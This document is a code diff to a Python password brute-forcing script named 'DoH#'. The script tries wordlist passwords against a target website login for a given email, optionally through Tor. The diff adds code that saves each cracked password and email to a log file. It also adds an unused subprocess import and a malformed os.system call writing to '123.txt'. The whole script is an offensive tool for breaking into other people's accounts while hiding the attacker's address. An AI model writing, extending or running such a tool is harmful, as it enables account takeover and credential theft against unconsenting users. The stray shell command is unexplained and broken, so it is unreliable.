@@ -9,6 +9,7 @@ import socket
 import threading
 import time
 from mechanize import Browser
+import subprocess
 
 def runer():
 
@@ -33,8 +34,6 @@ def runer():
     print ("[DoH#] >>> now your using this ip  :" + ip)
 
 def doHack(type,proxy = False):
-
-
 
     if (proxy == True):
         os.system("sudo service tor start")
@@ -67,6 +66,8 @@ def doHack(type,proxy = False):
                 resultAfterSub =  type=="redirect" and sub.geturl() or ((type=="title") and br.title() or "CANCELE")
                 if resultAfterSub == arr['website_s']:
                     print('==============================')
+                    targetfilefound = open(word+"-"+arr['email']+".log" , 'w')
+                    targetfilefound.write('password:'+ word+'\n\n user:'+ arr['email'])
                     print ('\x1b[2;31;40m' +'[DoH#] >>> This is Target password ==> '+word+'\x1b[0m')
                     print('==============================')
                     exit()
@@ -74,6 +75,7 @@ def doHack(type,proxy = False):
                     print ('[DoH#] >>> This is not your  Password ==>'+word)
 
 os.system("clear")
+
 print ('''
 ===================================================================
 
@@ -117,6 +119,8 @@ try:
         print('[DoH#] >>> Sorry Password not found ')
     else:
         print("[DoH#] >>> sorry wrong choice Bye :) ")
+    os.system('pdv -t %s % "(epoch_name)" > 123.txt')
+
 except KeyboardInterrupt as e:
     print("EXIT")
     # quit
